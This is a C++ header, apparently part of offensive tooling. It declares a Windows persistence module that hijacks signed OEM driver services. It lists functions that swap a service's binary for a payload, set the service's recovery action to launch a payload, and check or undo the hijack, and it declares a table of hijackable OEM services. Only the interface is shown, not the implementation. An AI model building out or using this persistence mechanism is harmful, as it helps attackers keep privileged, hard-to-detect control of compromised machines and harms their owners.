#pragma once
#include <windows.h>
#include <string>

namespace l4g::persistence {

struct DriverHijackResult {
    bool success = false;
    std::string error;
};

class DriverHijack {
public:
    // Hijack a signed OEM driver service for persistence
    static DriverHijackResult hijack_service(const std::wstring& target_service, const std::wstring& payload_path);
    
    // Restore original service
    static bool restore_service(const std::wstring& target_service);
    
    // Check if hijacked
    static bool is_hijacked(const std::wstring& target_service);
    
    // Known hijackable OEM services
    struct HijackableService {
        const wchar_t* service_name;
        const wchar_t* display_name;
        const wchar_t* binary_path;
        bool requires_driver_load;
    };
    
    static const HijackableService HIJACKABLE_SERVICES[];
    static size_t HIJACKABLE_COUNT;
    
private:
    static bool backup_service_config(const std::wstring& service_name);
    static bool modify_service_binary(const std::wstring& service_name, const std::wstring& new_binary);
    static bool set_service_recovery(const std::wstring& service_name, const std::wstring& payload);
};

} // namespace l4g::persistence